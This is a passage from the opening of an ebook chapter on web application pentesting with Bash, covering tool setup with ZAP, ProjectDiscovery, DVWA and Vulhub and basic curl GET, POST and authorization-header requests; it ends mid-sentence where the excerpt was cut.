<html><head></head><body>
  <div id="_idContainer107">
   <h1 class="chapter-number" id="_idParaDest-151">
    <a id="_idTextAnchor241">
    </a>
    <span class="koboSpan" id="kobo.1.1">
     9
    </span>
   </h1>
   <h1 id="_idParaDest-152">
    <a id="_idTextAnchor242">
    </a>
    <span class="koboSpan" id="kobo.2.1">
     Web Application Pentesting with Bash
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.3.1">
     This chapter explores how to use Bash for web application pentesting.
    </span>
    <span class="koboSpan" id="kobo.3.2">
     We’ll look at how Bash’s flexibility can help you find vulnerabilities, automate tasks, analyze responses, and manage web data.
    </span>
    <span class="koboSpan" id="kobo.3.3">
     By the end of this chapter, you’ll be able to use Bash to discover and exploit common web vulnerabilities, extract data efficiently, and integrate with other pentesting tools for a thorough
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.4.1">
      web assessment.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.5.1">
     There are generally five use cases for testing web
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.6.1">
      application security:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.7.1">
      Testing a single web application
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.8.1">
       in depth
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.9.1">
      Quickly testing (automated scanning) many web applications during a
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.10.1">
       network pentest
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.11.1">
      Creating scripts to fuzz
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.12.1">
       for vulnerabilities
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.13.1">
      Creating
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.14.1">
       proof-of-concept
      </span>
     </strong>
     <span class="koboSpan" id="kobo.15.1">
      (
     </span>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.16.1">
        PoC
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.17.1">
       ) exploits
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.18.1">
       Continuous integration and continuous delivery/deployment
      </span>
     </strong>
     <span class="koboSpan" id="kobo.19.1">
      (
     </span>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.20.1">
        CI/CD
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.21.1">
       ) testing
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.22.1">
     This chapter focuses on the second, third, and fourth use cases.
    </span>
    <span class="koboSpan" id="kobo.22.2">
     If I were testing in the first use case, I would prefer browser proxies such as
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.23.1">
      ZED Attack Proxy
     </span>
    </strong>
    <span class="koboSpan" id="kobo.24.1">
     (
    </span>
    <a href="https://www.zaproxy.org">
     <span class="koboSpan" id="kobo.25.1">
      https://www.zaproxy.org
     </span>
    </a>
    <span class="koboSpan" id="kobo.26.1">
     ), also known as
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.27.1">
      ZAP
     </span>
    </strong>
    <span class="koboSpan" id="kobo.28.1">
     , or Burp Suite (
    </span>
    <a href="https://portswigger.net/burp">
     <span class="koboSpan" id="kobo.29.1">
      https://portswigger.net/burp
     </span>
    </a>
    <span class="koboSpan" id="kobo.30.1">
     ).
    </span>
    <span class="koboSpan" id="kobo.30.2">
     These tools enable a tester to thoroughly explore an application.
    </span>
    <span class="koboSpan" id="kobo.30.3">
     In the case of ZAP, it does allow you to run the tool in a Bash terminal without showing the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.31.1">
      graphical user interface
     </span>
    </strong>
    <span class="koboSpan" id="kobo.32.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.33.1">
      GUI
     </span>
    </strong>
    <span class="koboSpan" id="kobo.34.1">
     ) to automate scanning.
    </span>
    <span class="koboSpan" id="kobo.34.2">
     I’ll be showing how to use ZAP in the terminal later in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.35.1">
      this chapter.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.36.1">
     In this chapter, we’re going to cover the following
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.37.1">
      main topics:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.38.1">
      Automating HTTP requests
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.39.1">
       in Bash
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.40.1">
      Analyzing web application security
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.41.1">
       with Bash
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.42.1">
      Learning advanced data
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.43.1">
       manipulation techniques
      </span>
     </span>
    </li>
   </ul>
   <h1 id="_idParaDest-153">
    <a id="_idTextAnchor243">
    </a>
    <span class="koboSpan" id="kobo.44.1">
     Technical requirements
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.45.1">
     The first prerequisite is that you started reading from
    </span>
    <a href="B22229_01.xhtml#_idTextAnchor017">
     <span class="No-Break">
      <em class="italic">
       <span class="koboSpan" id="kobo.46.1">
        Chapter 1
       </span>
      </em>
     </span>
    </a>
    <span class="koboSpan" id="kobo.47.1">
     and have access to a Bash shell.
    </span>
    <span class="koboSpan" id="kobo.47.2">
     You should be using Kali Linux, as discussed in
    </span>
    <a href="B22229_01.xhtml#_idTextAnchor017">
     <span class="No-Break">
      <em class="italic">
       <span class="koboSpan" id="kobo.48.1">
        Chapter 1
       </span>
      </em>
     </span>
    </a>
    <span class="koboSpan" id="kobo.49.1">
     .
    </span>
    <span class="koboSpan" id="kobo.49.2">
     You will find it difficult to follow along if you’re using a different
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.50.1">
      operating system.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.51.1">
     Ensure that you have installed
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.52.1">
      ProjectDiscovery
     </span>
    </strong>
    <span class="koboSpan" id="kobo.53.1">
     tools before
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.54.1">
      advancing:
     </span>
     <a id="_idTextAnchor244">
     </a>
     <a id="_idTextAnchor245">
     </a>
    </span>
    <a href="https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter01#install-project-discovery-tools">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.55.1">
       https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter01#install-project-discovery-tools
      </span>
     </span>
    </a>
   </p>
   <p>
    <span class="koboSpan" id="kobo.56.1">
     Run the following commands to configure
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.57.1">
      software prerequisites:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.58.1">
$ sudo apt update &amp;&amp; sudo apt install -y zaproxy curl wget parallel chromium
$ sudo apt remove python3-httpx</span></pre>
   <p>
    <span class="koboSpan" id="kobo.59.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.60.1">
      httpx
     </span>
    </strong>
    <span class="koboSpan" id="kobo.61.1">
     entry must be removed because the command name clashes with the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.62.1">
      httpx
     </span>
    </strong>
    <span class="koboSpan" id="kobo.63.1">
     command
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.64.1">
      from ProjectDiscovery.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.65.1">
     The code for this chapter can be found
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.66.1">
      at
     </span>
    </span>
    <a href="https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter09">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.67.1">
       https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter09
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.68.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.69.1">
     If you want to follow along interactively with the section that shows how to use
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.70.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.71.1">
     to automate testing for
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.72.1">
      SQL injection
     </span>
    </strong>
    <span class="koboSpan" id="kobo.73.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.74.1">
      SQLi
     </span>
    </strong>
    <span class="koboSpan" id="kobo.75.1">
     ), you’ll need to install
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.76.1">
      Damn Vulnerable Web Application
     </span>
    </strong>
    <span class="koboSpan" id="kobo.77.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.78.1">
      DVWA
     </span>
    </strong>
    <span class="koboSpan" id="kobo.79.1">
     ), available at
    </span>
    <a href="https://github.com/digininja/DVWA">
     <span class="koboSpan" id="kobo.80.1">
      https://github.com/digininja/DVWA
     </span>
    </a>
    <span class="koboSpan" id="kobo.81.1">
     .
    </span>
    <span class="koboSpan" id="kobo.81.2">
     I’ll be running DVWA in Docker, which is the quickest way to start up the application.
    </span>
    <span class="koboSpan" id="kobo.81.3">
     I’ll also be using Vulhub (
    </span>
    <a href="https://github.com/vulhub/vulhub">
     <span class="koboSpan" id="kobo.82.1">
      https://github.com/vulhub/vulhub
     </span>
    </a>
    <span class="koboSpan" id="kobo.83.1">
     ) when demonstrating a
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.84.1">
       nuclei
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.85.1">
      scan.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-154">
    <a id="_idTextAnchor246">
    </a>
    <span class="koboSpan" id="kobo.86.1">
     Automating HTTP requests in Bash
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.87.1">
     Any serious discussion
    </span>
    <a id="_idIndexMarker515">
    </a>
    <span class="koboSpan" id="kobo.88.1">
     on making HTTP requests in a terminal must start with
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.89.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.90.1">
     .
    </span>
    <span class="koboSpan" id="kobo.90.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.91.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.92.1">
     tool is a command-line tool used for transferring data to or from a server using various protocols such as HTTP, HTTPS, FTP, and more.
    </span>
    <span class="koboSpan" id="kobo.92.2">
     It is widely used in pentesting to interact with web applications, sending custom requests to uncover vulnerabilities.
    </span>
    <span class="koboSpan" id="kobo.92.3">
     You can visit the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.93.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.94.1">
     website and learn more by
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.95.1">
      visiting
     </span>
    </span>
    <a href="https://curl.se">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.96.1">
       https://curl.se
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.97.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.98.1">
     I believe that most pentesters would prefer to use a browser proxy such as ZAP or Burp, or Python scripts for web application testing.
    </span>
    <span class="koboSpan" id="kobo.98.2">
     However, knowledge of using
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.99.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.100.1">
     in a Bash shell comes in handy.
    </span>
    <span class="koboSpan" id="kobo.100.2">
     While I was writing this chapter, someone I worked with reached out to me for my help recreating a Metasploit HTTP exploit module in Bash because they couldn’t install Metasploit or any Python modules in the testing environment.
    </span>
    <span class="koboSpan" id="kobo.100.3">
     The testing
    </span>
    <a id="_idIndexMarker516">
    </a>
    <span class="koboSpan" id="kobo.101.1">
     environment did have Bash and common command-line tools such as
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.102.1">
       curl
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.103.1">
      installed.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.104.1">
     Here are some common
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.105.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.106.1">
     options that are useful
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.107.1">
      for pentesters:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.108.1">
       -X
      </span>
     </strong>
     <span class="koboSpan" id="kobo.109.1">
      or
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.110.1">
       --request
      </span>
     </strong>
     <span class="koboSpan" id="kobo.111.1">
      : Specify the request method (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.112.1">
       GET
      </span>
     </strong>
     <span class="koboSpan" id="kobo.113.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.114.1">
       POST
      </span>
     </strong>
     <span class="koboSpan" id="kobo.115.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.116.1">
       PUT
      </span>
     </strong>
     <span class="koboSpan" id="kobo.117.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.118.1">
       DELETE
      </span>
     </strong>
     <span class="koboSpan" id="kobo.119.1">
      , and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.120.1">
       so on)
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.121.1">
       -d
      </span>
     </strong>
     <span class="koboSpan" id="kobo.122.1">
      or
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.123.1">
       --data
      </span>
     </strong>
     <span class="koboSpan" id="kobo.124.1">
      : Send data with a
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.125.1">
        POST
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.126.1">
       request
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.127.1">
       -H
      </span>
     </strong>
     <span class="koboSpan" id="kobo.128.1">
      or
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.129.1">
       --header
      </span>
     </strong>
     <span class="koboSpan" id="kobo.130.1">
      : Pass custom headers to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.131.1">
       the server
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.132.1">
       -I
      </span>
     </strong>
     <span class="koboSpan" id="kobo.133.1">
      or
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.134.1">
       --head
      </span>
     </strong>
     <span class="koboSpan" id="kobo.135.1">
      : Show response header
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.136.1">
       info only
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.137.1">
       -u
      </span>
     </strong>
     <span class="koboSpan" id="kobo.138.1">
      or
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.139.1">
       --user
      </span>
     </strong>
     <span class="koboSpan" id="kobo.140.1">
      : Include
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.141.1">
       user authentication
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.142.1">
       -o
      </span>
     </strong>
     <span class="koboSpan" id="kobo.143.1">
      or
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.144.1">
       --output
      </span>
     </strong>
     <span class="koboSpan" id="kobo.145.1">
      : Write output to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.146.1">
       a file
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.147.1">
       -s
      </span>
     </strong>
     <span class="koboSpan" id="kobo.148.1">
      or
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.149.1">
       --silent
      </span>
     </strong>
     <span class="koboSpan" id="kobo.150.1">
      : Silent mode (no progress bar or
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.151.1">
       error messages)
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.152.1">
       -k
      </span>
     </strong>
     <span class="koboSpan" id="kobo.153.1">
      or
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.154.1">
       --insecure
      </span>
     </strong>
     <span class="koboSpan" id="kobo.155.1">
      : Allow insecure server connections when
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.156.1">
       using SSL
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.157.1">
       -L
      </span>
     </strong>
     <span class="koboSpan" id="kobo.158.1">
      or
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.159.1">
       --location
      </span>
     </strong>
     <span class="koboSpan" id="kobo.160.1">
      :
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.161.1">
       Follow redirects
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.162.1">
       -w
      </span>
     </strong>
     <span class="koboSpan" id="kobo.163.1">
      or
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.164.1">
       --write-out &lt;format&gt;
      </span>
     </strong>
     <span class="koboSpan" id="kobo.165.1">
      : Make
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.166.1">
       curl
      </span>
     </strong>
     <span class="koboSpan" id="kobo.167.1">
      display information on
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.168.1">
       stdout
      </span>
     </strong>
     <span class="koboSpan" id="kobo.169.1">
      after a
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.170.1">
       completed transfer
      </span>
     </span>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.171.1">
       The format is a string that may contain plain text mixed with any number
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.172.1">
        of variables.
       </span>
      </span>
     </p>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.173.1">
       -Z
      </span>
     </strong>
     <span class="koboSpan" id="kobo.174.1">
      or
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.175.1">
       --parallel
      </span>
     </strong>
     <span class="koboSpan" id="kobo.176.1">
      : Makes
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.177.1">
       curl
      </span>
     </strong>
     <span class="koboSpan" id="kobo.178.1">
      perform its transfers in parallel as compared to the regular
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.179.1">
       serial manner
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.180.1">
     We’ll be covering usage examples of the preceding options throughout
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.181.1">
      this section.
     </span>
    </span>
   </p>
   <p>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.182.1">
      GET
     </span>
    </strong>
    <span class="koboSpan" id="kobo.183.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.184.1">
      POST
     </span>
    </strong>
    <span class="koboSpan" id="kobo.185.1">
     requests are the most common HTTP request methods.
    </span>
    <span class="koboSpan" id="kobo.185.2">
     There are many more.
    </span>
    <span class="koboSpan" id="kobo.185.3">
     To learn more,
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.186.1">
      see
     </span>
    </span>
    <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.187.1">
       https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.188.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.189.1">
     A
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.190.1">
      GET
     </span>
    </strong>
    <span class="koboSpan" id="kobo.191.1">
     request is used to retrieve information from a server.
    </span>
    <span class="koboSpan" id="kobo.191.2">
     Here’s how to use
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.192.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.193.1">
     to make a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.194.1">
      GET
     </span>
    </strong>
    <span class="koboSpan" id="kobo.195.1">
     request:
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.196.1">
      curl -X
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.197.1">
       GET
      </span>
     </strong>
    </span>
    <a href="https://example.com">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.198.1">
       https://example.com
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.199.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.200.1">
     Here is an explanation of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.201.1">
      this
     </span>
    </span>
    <span class="No-Break">
     <a id="_idIndexMarker517">
     </a>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.202.1">
      command:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.203.1">
       curl
      </span>
     </strong>
     <span class="koboSpan" id="kobo.204.1">
      : Invokes the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.205.1">
        curl
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.206.1">
       command
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.207.1">
       -X GET
      </span>
     </strong>
     <span class="koboSpan" id="kobo.208.1">
      : Specifies the request method
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.209.1">
       as
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.210.1">
        GET
       </span>
      </strong>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.211.1">
       https://example.com
      </span>
     </strong>
     <span class="koboSpan" id="kobo.212.1">
      : The URL of the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.213.1">
       target server
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.214.1">
     A
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.215.1">
      POST
     </span>
    </strong>
    <span class="koboSpan" id="kobo.216.1">
     request is used to send data to a server in the body of a request.
    </span>
    <span class="koboSpan" id="kobo.216.2">
     Here’s an example:
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.217.1">
      curl -X POST https://example.com/login -
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.218.1">
       d "username=user&amp;password=pass"
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.219.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.220.1">
     The following points explain
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.221.1">
      this command:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.222.1">
       -X POST
      </span>
     </strong>
     <span class="koboSpan" id="kobo.223.1">
      : Specifies the request method
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.224.1">
       as
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.225.1">
        POST
       </span>
      </strong>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.226.1">
       -d "username=user&amp;password=pass"
      </span>
     </strong>
     <span class="koboSpan" id="kobo.227.1">
      : Sends data with
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.228.1">
       the request
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.229.1">
     The key difference between a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.230.1">
      GET
     </span>
    </strong>
    <span class="koboSpan" id="kobo.231.1">
     and a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.232.1">
      POST
     </span>
    </strong>
    <span class="koboSpan" id="kobo.233.1">
     request is how data is sent to the server.
    </span>
    <span class="koboSpan" id="kobo.233.2">
     A
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.234.1">
      GET
     </span>
    </strong>
    <span class="koboSpan" id="kobo.235.1">
     request sends data in the URL as parameters.
    </span>
    <span class="koboSpan" id="kobo.235.2">
     A raw
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.236.1">
      GET
     </span>
    </strong>
    <span class="koboSpan" id="kobo.237.1">
     request looks like
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.238.1">
      the following:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer093">
     <span class="koboSpan" id="kobo.239.1">
      <img alt="Figure 9.1 – An example GET request" src="image/B22229_09_01.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.240.1">
     Figure 9.1 – An example GET request
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.241.1">
     The key area to focus on in the preceding figure is the first line, which starts with the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.242.1">
      GET
     </span>
    </strong>
    <span class="koboSpan" id="kobo.243.1">
     method, followed by the relative URL (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.244.1">
      /admin/report?year=2024&amp;month=7
     </span>
    </strong>
    <span class="koboSpan" id="kobo.245.1">
     ) and HTTP specification (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.246.1">
      HTTP/2
     </span>
    </strong>
    <span class="koboSpan" id="kobo.247.1">
     ).
    </span>
    <span class="koboSpan" id="kobo.247.2">
     As you can see in the figure, data is sent to the server in the URL as the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.248.1">
      year
     </span>
    </strong>
    <span class="koboSpan" id="kobo.249.1">
     and
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.250.1">
       month
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.251.1">
      parameters.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.252.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.253.1">
      POST
     </span>
    </strong>
    <span class="koboSpan" id="kobo.254.1">
     request method sends data in the request body.
    </span>
    <span class="koboSpan" id="kobo.254.2">
     A raw
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.255.1">
      POST
     </span>
    </strong>
    <span class="koboSpan" id="kobo.256.1">
     request looks similar to the one shown in the
    </span>
    <a id="_idIndexMarker518">
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.257.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer094">
     <span class="koboSpan" id="kobo.258.1">
      <img alt="Figure 9.2 – An example POST request" src="image/B22229_09_02.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.259.1">
     Figure 9.2 – An example POST request
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.260.1">
     The key point to notice in the preceding figure is that data is sent to the server in the request body (the last line), which follows the headers (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.261.1">
      keyword:
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.262.1">
       value
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.263.1">
      pairs).
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.264.1">
     Many web applications require authentication headers.
    </span>
    <span class="koboSpan" id="kobo.264.2">
     Here’s how to include them in your request:
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.265.1">
      curl -X GET https://example.com/protected -H "Authorization:
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.266.1">
       Bearer &lt;token&gt;"
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.267.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.268.1">
     You can send data from a file using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.269.1">
      --data-binary
     </span>
    </strong>
    <span class="koboSpan" id="kobo.270.1">
     option:
    </span>
    <strong class="source-inline">
